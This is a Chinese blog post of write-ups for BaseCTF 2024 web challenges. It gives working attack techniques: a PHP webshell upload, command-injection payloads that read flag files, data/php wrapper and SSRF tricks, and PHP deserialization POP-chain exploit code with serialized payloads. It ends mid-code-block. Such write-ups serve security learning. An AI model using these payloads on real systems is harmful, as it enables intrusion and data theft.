<!DOCTYPE html>

<meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=0">

  <meta name="description" content="Week1A Dark Room查看源代码即可

HTTP 是什么呀
考察http协议

提交后抓包发现

base64解密即可
喵喵喵´•ﻌ•&amp;#96;
eval函数把参数当做php代码执行
md5绕过欸
一个弱相等，一个强相等，md5函数无法处理数组，会返回NULL，所以都可以用数组绕过

up">


<link rel="alternate" href="/atom.xml" title="ccgetflag" type="application/atom+xml">
<meta name="theme-color" content="#a1d0f6">
<title>2024BaseCTF-web - ccgetflag</title>
<!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
<link rel="shortcut icon" href="/favicon.png">

<link rel="stylesheet" href="/css/style.css">

<nav class="main-nav">
	
	    <a href="/">← Home</a>
	
	
	    <a href="/about/">About</a>
	
	    <a href="/archives/">Archives</a>
	
	<a class="cta" href="/atom.xml" data-no-instant>Subscribe</a>
</nav>

<section id="wrapper">
    <article class="post">
    <header>
        
            <h1>2024BaseCTF-web</h1>
        
        <h2 class="headline">Sep 04 2024
        
        </h2>
    </header>
</article>
<section id="post-body"><h1 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h1><h3 id="A-Dark-Room"><a href="#A-Dark-Room" class="headerlink" title="A Dark Room"></a>A Dark Room</h3><p>查看源代码即可</p>
<p><img src="/source/images/2024BaseCTF-web/1.png"></p>
<h3 id="HTTP-是什么呀"><a href="#HTTP-是什么呀" class="headerlink" title="HTTP 是什么呀"></a>HTTP 是什么呀</h3><p><img src="/source/images/2024BaseCTF-web/2-1725437518992.png"></p>
<p>考察http协议</p>
<p><img src="/source/images/2024BaseCTF-web/3-1725437540740.png"></p>
<p>提交后抓包发现</p>
<p><img src="/source/images/2024BaseCTF-web/4-1725437568099.png"></p>
<p>base64解密即可</p>
<h3 id="喵喵喵´•ﻌ•"><a href="#喵喵喵´•ﻌ•" class="headerlink" title="喵喵喵´•ﻌ•&#96;"></a>喵喵喵´•ﻌ•&#96;</h3><p><img src="/source/images/2024BaseCTF-web/5-1725437616225.png"></p>
<p>eval函数把参数当做php代码执行</p>
<h3 id="md5绕过欸"><a href="#md5绕过欸" class="headerlink" title="md5绕过欸"></a>md5绕过欸</h3><p><img src="/source/images/2024BaseCTF-web/6-1725437682383.png"></p>
<p>一个弱相等，一个强相等，md5函数无法处理数组，会返回NULL，所以都可以用数组绕过</p>
<p><img src="/source/images/2024BaseCTF-web/7-1725437754093.png"></p>
<h3 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h3><p>无任何过滤</p>
<p><img src="/source/images/2024BaseCTF-web/8-1725437823803.png"></p>
<p>上传一句话木马php文件，用蚁剑连接，注意路径为url&#x2F;uploads&#x2F;文件名</p>
<h3 id="Aura-酱的礼物"><a href="#Aura-酱的礼物" class="headerlink" title="Aura 酱的礼物"></a>Aura 酱的礼物</h3><p><img src="/source/images/2024BaseCTF-web/9-1725437921268.png"></p>
<p>三层，第一层要绕过file_get_contents函数，用data伪协议将内容写入文件</p>
<p>第二层strpos函数要求challenge值只能以<a target="_blank" rel="noopener" href="http://jasmineaura.github.io开头/">http://jasmineaura.github.io开头</a></p>
<p>第三层要求读取变量内容包含’已经收到Kengwang的礼物啦’字符串，考了ssrf，可以用@过滤，使其解析@后面的地址</p>
<p>最后gift用php伪协议读取文件</p>
<p><img src="/source/images/2024BaseCTF-web/10.png"></p>
<h1 id="Week2"><a href="#Week2" class="headerlink" title="Week2"></a>Week2</h1><h3 id="一起吃豆豆"><a href="#一起吃豆豆" class="headerlink" title="一起吃豆豆"></a>一起吃豆豆</h3><p><img src="/source/images/2024BaseCTF-web/11-1725439640893.png"></p>
<p>前端有个base64字符串，解密后即可</p>
<h3 id="RCEisamazingwithspace"><a href="#RCEisamazingwithspace" class="headerlink" title="RCEisamazingwithspace"></a>RCEisamazingwithspace</h3><p><img src="/source/images/2024BaseCTF-web/12.png"></p>
<p>过滤了空白字符，用${IFS}过滤</p>
<p>payload: cmd&#x3D;cat${IFS}&#x2F;f* </p>
<h3 id="你听不到我的声音"><a href="#你听不到我的声音" class="headerlink" title="你听不到我的声音"></a>你听不到我的声音</h3><p><img src="/source/images/2024BaseCTF-web/13.png"></p>
<p>shell_exec函数无回显，但我们可以将结果写入文件然后访问</p>
<p>payload:cmd&#x3D;cat &#x2F;f* &gt;1.txt 将cat &#x2F;f*的内容写入1.txt然后访问</p>
<p><img src="/source/images/2024BaseCTF-web/14.png"></p>
<h3 id="ez-ser"><a href="#ez-ser" class="headerlink" title="ez_ser"></a>ez_ser</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">re</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$chu0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;chu0))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;I can not believes!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;chu0-&gt;<span class="variable">$nononono</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">web</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$kw</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dt</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;lalalla&quot;</span>.<span class="variable language_">$this</span>-&gt;kw;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ALL Done!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pwn</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dusk</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$over</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;dusk != <span class="string">&quot;gods&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;什么，你竟敢不认可?&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;over-&gt;<span class="title function_ invoke__">getflag</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Misc</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nothing</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Crypto</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;happy happy happy!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you are over!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ser</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ser&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>pop链：getflag()–&gt;__get($name)–&gt; __toString()–&gt;__wakeup()</p>
<p>getflag执行系统命令，get($name)当指向未定义的变量时执行， __toString()变量被当做字符串输出是执行(一般有echo这种输出命令)，__wakeup()反序列化之前执行。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">re</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$chu0</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">​    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;chu0))&#123;</span><br><span class="line">​      <span class="keyword">return</span> <span class="string">&quot;I can not believes!&quot;</span>;</span><br><span class="line">​    &#125;</span><br><span class="line">​    <span class="variable language_">$this</span>-&gt;chu0-&gt;<span class="variable">$nononono</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">web</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$kw</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$dt</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">​    <span class="keyword">echo</span> <span class="string">&quot;lalalla&quot;</span>.<span class="variable language_">$this</span>-&gt;kw;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">​    <span class="keyword">echo</span> <span class="string">&quot;ALL Done!&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pwn</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$dusk</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$over</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">​    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;dusk != <span class="string">&quot;gods&quot;</span>)&#123;</span><br><span class="line">​      <span class="keyword">echo</span> <span class="string">&quot;什么，你竟敢不认可?&quot;</span>;</span><br><span class="line">​    &#125;</span><br><span class="line">​    <span class="variable language_">$this</span>-&gt;over-&gt;<span class="title function_ invoke__">getflag</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Misc</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$nothing</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$flag</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">​    <span class="keyword">eval</span>(<span class="string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">web</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title function_ invoke__">re</span>();</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title function_ invoke__">pwn</span>();</span><br><span class="line"><span class="variable">$d</span>=<span class="keyword">new</span> <span class="title class_">Misc</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;kw=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;chu0=<span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;dusk=<span class="string">&#x27;gods&#x27;</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;over=<span class="variable">$d</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>))</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>payload:?ser&#x3D;O%3A3%3A”web”%3A2%3A{s%3A2%3A”kw”%3BO%3A2%3A”re”%3A1%3A{s%3A4%3A”chu0”%3BO%3A3%3A”pwn”%3A2%3A{s%3A4%3A”dusk”%3Bs%3A4%3A”gods”%3Bs%3A4%3A”over”%3BO%3A4%3A”Misc”%3A2%3A{s%3A7%3A”nothing”%3BN%3Bs%3A4%3A”flag”%3BN%3B}}}s%3A2%3A”dt”%3BN%3B}</p>
<h3 id="Really-EZ-POP"><a href="#Really-EZ-POP" class="headerlink" title="Really EZ POP"></a>Really EZ POP</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sink</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span> = <span class="string">&#x27;echo 123;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shark</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$word</span> = <span class="string">&#x27;Hello, World!&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Shark says:&#x27;</span> . <span class="variable language_">$this</span>-&gt;word;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sea</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$animal</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$sea_ani</span> = <span class="variable language_">$this</span>-&gt;animal;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;In a deep deep sea, there is a &#x27;</span> . <span class="variable">$sea_ani</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Nature</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sea</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;sea-&gt;see;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;nature&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$nature</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;nature&#x27;</span>]);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>pop链：__toString()–&gt;__invoke()–&gt;__get($name)–&gt;__destruct()</p>
<p>invoke()函数：变量被当做函数时执行</p>
<p>exp:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sink</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$cmd</span> = <span class="string">&quot;echo 123&quot;</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">​    <span class="variable language_">$this</span>-&gt;cmd=<span class="string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">​    <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shark</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$word</span> = <span class="string">&#x27;Hello, World!&#x27;</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">​    <span class="variable language_">$this</span>-&gt;word=<span class="keyword">new</span> <span class="title class_">Sink</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">​    <span class="keyword">echo</span> <span class="string">&#x27;Shark says:&#x27;</span> . <span class="variable language_">$this</span>-&gt;word;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sea</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$animal</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">​    <span class="variable language_">$this</span>-&gt;animal=<span class="keyword">new</span> <span class="title class_">Shark</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">​    <span class="variable">$sea_ani</span> = <span class="variable language_">$this</span>-&gt;animal;</span><br><span class="line">​    <span class="keyword">echo</span> <span class="string">&#x27;In a deep deep sea, there is a &#x27;</span> . <span class="variable">$sea_ani</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Nature</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$sea</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">​    <span class="variable language_">$this</span>-&gt;sea=<span class="keyword">new</span> <span class="title class_">Sea</span>();;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">​    <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;sea-&gt;see;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Nature</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="数学大师"><a href="#数学大师" class="headerlink" title="数学大师"></a>数学大师</h3><p>考的python爬虫，直接贴脚本吧</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line">url = <span class="string">&#x27;http://challenge.basectf.fun:47827/&#x27;</span></span><br><span class="line">headers = &#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">evaluate_expression</span>(<span class="params">text</span>):</span><br><span class="line">    pattern = <span class="string">r&quot;(?&lt;=second\s)(.*?)(?=\?)&quot;</span></span><br><span class="line">    <span class="keyword">match</span> = re.search(pattern, text)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">        expression = <span class="keyword">match</span>.group(<span class="number">0</span>).replace(<span class="string">&#x27;×&#x27;</span>, <span class="string">&#x27;*&#x27;</span>).replace(<span class="string">&#x27;÷&#x27;</span>, <span class="string">&#x27;//&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">eval</span>(expression)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">response = session.get(url, headers=headers, verify=<span class="literal">False</span>, timeout=<span class="number">3</span>)</span><br><span class="line">text = response.text</span><br><span class="line">result = evaluate_expression(text)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">if</span> result <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        payload = <span class="string">f&#x27;answer=<span class="subst">&#123;result&#125;</span>&#x27;</span></span><br><span class="line">        response = session.post(url, data=payload, headers=headers, verify=<span class="literal">False</span>, timeout=<span class="number">3</span>)</span><br><span class="line">        text = response.text</span><br><span class="line">        <span class="built_in">print</span>(text)</span><br><span class="line">        result = evaluate_expression(text)  </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;No valid expression found.&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="所以你说你懂-MD5"><a href="#所以你说你懂-MD5" class="headerlink" title="所以你说你懂 MD5?"></a>所以你说你懂 MD5?</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span 